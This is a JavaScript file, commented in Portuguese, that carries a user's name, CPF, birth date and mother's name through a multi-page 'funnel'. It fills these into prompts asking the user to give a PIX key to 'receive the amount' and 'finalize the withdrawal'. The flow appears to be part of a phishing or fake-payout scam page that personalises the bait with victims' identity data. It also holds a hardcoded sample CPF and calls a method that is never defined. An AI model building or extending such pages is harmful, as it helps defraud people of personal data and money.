/**
 * Sistema de Gestão de Dados do Usuário
 * Responsável por capturar, armazenar e disponibilizar dados do usuário em todo o funil
 */

(function() {
  'use strict';

  /**
   * Classe para gerenciar dados do usuário
   */
  class UserDataManager {
    constructor() {
      this.userData = null;
      this.init();
    }

    /**
     * Inicializa o sistema de dados
     */
    init() {
      this.loadUserData();
      this.setupDataPropagation();
    }

    /**
     * Carrega dados do usuário da URL ou sessionStorage
     */
    loadUserData() {
      try {
        // PRIORIDADE 1: Tentar pegar dados da URL
        const urlParams = new URLSearchParams(window.location.search);
        if (urlParams.has('nome') || urlParams.has('cpf')) {
          console.log('🔗 Carregando dados da URL');
          this.userData = {
            nome: urlParams.get('nome'),
            cpf: urlParams.get('cpf'),
            nascimento: urlParams.get('nascimento'),
            nomeMae: urlParams.get('nomeMae'),
            estadoCivil: urlParams.get('estadoCivil'),
            nomeCompleto: urlParams.get('nomeCompleto') || urlParams.get('nome')
          };
          
          // Salvar na sessionStorage para páginas seguintes
          sessionStorage.setItem('userData', JSON.stringify(this.userData));
          console.log('✅ Dados carregados da URL e salvos:', this.userData);
          return;
        }
        
        // PRIORIDADE 2: Tentar pegar do sessionStorage
        const storedData = sessionStorage.getItem('userData');
        if (storedData) {
          this.userData = JSON.parse(storedData);
          console.log('✅ Dados do usuário carregados do sessionStorage:', this.userData);
        } else {
          // NÃO usar dados padrão - deixar vazio
          this.userData = null;
          console.log('⚠️ Nenhum dado encontrado na URL ou sessionStorage');
        }
      } catch (error) {
        console.error('❌ Erro ao carregar dados do usuário:', error);
        this.userData = null;
      }
    }

    /**
     * Salva dados do usuário no sessionStorage
     */
    saveUserData(data) {
      try {
        this.userData = { ...this.userData, ...data };
        sessionStorage.setItem('userData', JSON.stringify(this.userData));
        console.log('💾 Dados do usuário salvos:', this.userData);
        this.updatePageData();
      } catch (error) {
        console.error('❌ Erro ao salvar dados do usuário:', error);
      }
    }

    /**
     * Obtém dados do usuário
     */
    getUserData() {
      return this.userData;
    }

    /**
     * Obtém nome do usuário (primeiro nome)
     */
    getUserName() {
      if (!this.userData || !this.userData.nome) return null;
      return this.userData.nome.split(' ')[0];
    }

    /**
     * Obtém nome completo do usuário
     */
    getUserFullName() {
      return this.userData?.nomeCompleto || this.userData?.nome || null;
    }

    /**
     * Obtém CPF formatado
     */
    getUserCPF() {
      return this.userData?.cpf || null;
    }

    /**
     * Obtém data de nascimento do usuário
     */
    getUserBirthDate() {
      return this.userData?.nascimento || null;
    }

    /**
     * Obtém nome da mãe do usuário
     */
    getUserMotherName() {
      return this.userData?.nomeMae || null;
    }

    /**
     * Formata CPF para exibição
     */
    formatCPF(cpf) {
      if (!cpf) return '000.000.000-00';
      const cleaned = cpf.replace(/\D/g, '');
      if (cleaned.length !== 11) return cpf;
      return cleaned.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, '$1.$2.$3-$4');
    }

    /**
     * Configura propagação automática de dados
     */
    setupDataPropagation() {
      // Aguardar DOM carregar completamente
      if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', () => this.updatePageData());
      } else {
        this.updatePageData();
      }
    }

    /**
     * Atualiza dados na página atual
     */
    updatePageData() {
      if (!this.userData) {
        console.log('⚠️ Nenhum dado disponível para atualizar a página');
        return;
      }

      const firstName = this.getUserName();
      const fullName = this.getUserFullName();
      const cpf = this.getUserCPF();

      // Só atualizar se os dados existem
      if (!firstName || !fullName) {
        console.log('⚠️ Dados do usuário incompletos, não atualizando página');
        return;
      }

      // Mapeamento de seletores para substituição de dados
      const dataSelectors = {
        // Saudações no dropdown
        '[data-user-greeting]': `Olá, ${firstName}!`,
        
        // Nome do usuário em títulos e textos
        '[data-user-name]': firstName,
        '[data-user-fullname]': fullName,
        '[data-user-fullname-uppercase]': fullName.toUpperCase(),
        
        // CPF em diversos formatos (só se existir)
        ...(cpf && { '[data-user-cpf]': cpf }),
        
        // Textos específicos por página
        '[data-consult-title]': `Consultando dados de ${firstName}`,
        '[data-pix-instruction]': `${firstName}, informe sua chave PIX para receber o valor`,
        '[data-review-instruction]': `${fullName}, revise as informações antes de finalizar o saque`,
        '[data-final-instruction]': `${firstName}, finalize o processo para receber seus valores`,
        
        // Campo do comprovante
        '#comprovanteNome': fullName.toUpperCase(),
      };

      // Aplicar substituições
      Object.entries(dataSelectors).forEach(([selector, value]) => {
        const elements = document.querySelectorAll(selector);
        elements.forEach(element => {
          if (element.tagName === 'INPUT') {
            element.value = value;
          } else {
            element.textContent = value;
          }
        });
      });

      // Substituições específicas para elementos sem data attributes (fallback)
      this.updateFallbackElements(firstName, fullName, cpf);

      // Atualizar elementos especiais com IDs específicos
      this.updateSpecialElements(firstName, fullName, cpf);
    }

    /**
     * Atualiza elementos que não têm data attributes (para compatibilidade)
     */
    updateFallbackElements(firstName, fullName, cpf) {
      // Elementos específicos que podem não ter data attributes
      const fallbackUpdates = [
        // Saudações
        { 
          text: 'Olá, Silvio!', 
          newText: `Olá, ${firstName}!` 
        },
        
        // Títulos de consulta
        { 
          text: 'Consultando dados de Silvio', 
          newText: `Consultando dados de ${firstName}` 
        },
        
        // CPF específicos
        { 
          text: '717.148.209-04', 
          newText: cpf 
        },
        
        // Instruções PIX
        { 
          text: 'Silvio, informe sua chave PIX para receber o valor', 
          newText: `${firstName}, informe sua chave PIX para receber o valor` 
        },
        
        // Instruções de revisão
        { 
          text: 'João Silva, revise as informações antes de finalizar o saque', 
          newText: `${fullName}, revise as informações antes de finalizar o saque` 
        },
        
        // Instruções finais
        { 
          text: 'Silvio, finalize o processo para receber seus valores', 
          newText: `${firstName}, finalize o processo para receber seus valores` 
        }
      ];

      fallbackUpdates.forEach(({ text, newText }) => {
        this.replaceTextInPage(text, newText);
      });

      // Atualizar campos de input específicos
      const nomeInput = document.getElementById('comprovanteNome');
      if (nomeInput) {
        nomeInput.value = fullName.toUpperCase();
      }

      // Atualizar variáveis JavaScript para nome
      if (window.updateUserVariables) {
        window.updateUserVariables(fullName);
      }
    }

    /**
     * Atualiza elementos especiais com IDs específicos
     */
    updateSpecialElements(firstName, fullName, cpf) {
      // Campo do comprovante
      const comprovanteNome = document.getElementById('comprovanteNome');
      if (comprovanteNome) {
        comprovanteNome.value = fullName.toUpperCase();
      }

      // Outros elementos especiais podem ser adicionados aqui
    }

    /**
     * Substitui texto específico na página
     */
    replaceTextInPage(oldText, newText) {
      const walker = document.createTreeWalker(
        document.body,
        NodeFilter.SHOW_TEXT,
        null,
        false
      );

      const textNodes = [];
      let node;
      while (node = walker.nextNode()) {
        textNodes.push(node);
      }

      textNodes.forEach(textNode => {
        if (textNode.textContent.includes(oldText)) {
          textNode.textContent = textNode.textContent.replace(oldText, newText);
        }
      });
    }

    /**
     * Limpa dados do usuário
     */
    clearUserData() {
      sessionStorage.removeItem('userData');
      this.userData = null;
      console.log('🗑️ Dados do usuário limpos');
    }
  }

  // Instância global do gerenciador
  window.UserDataManager = new UserDataManager();

  // Funções globais para compatibilidade
  window.getUserData = () => window.UserDataManager.getUserData();
  window.getUserName = () => window.UserDataManager.getUserName();
  window.getUserFullName = () => window.UserDataManager.getUserFullName();
  window.getUserCPF = () => window.UserDataManager.getUserCPF();
  window.getUserBirthDate = () => window.UserDataManager.getUserBirthDate();
  window.getUserMotherName = () => window.UserDataManager.getUserMotherName();
  window.getUserMaritalStatus = () => window.UserDataManager.getUserMaritalStatus();
  window.saveUserData = (data) => window.UserDataManager.saveUserData(data);

  // Função para atualizar variáveis de nome em scripts
  window.updateUserVariables = function(fullName) {
    // Atualizar variáveis globais se existirem
    if (typeof window.nomeUsuario !== 'undefined') {
      window.nomeUsuario = fullName;
    }
  };

  console.log('🚀 Sistema de gestão de dados do usuário inicializado');
})();
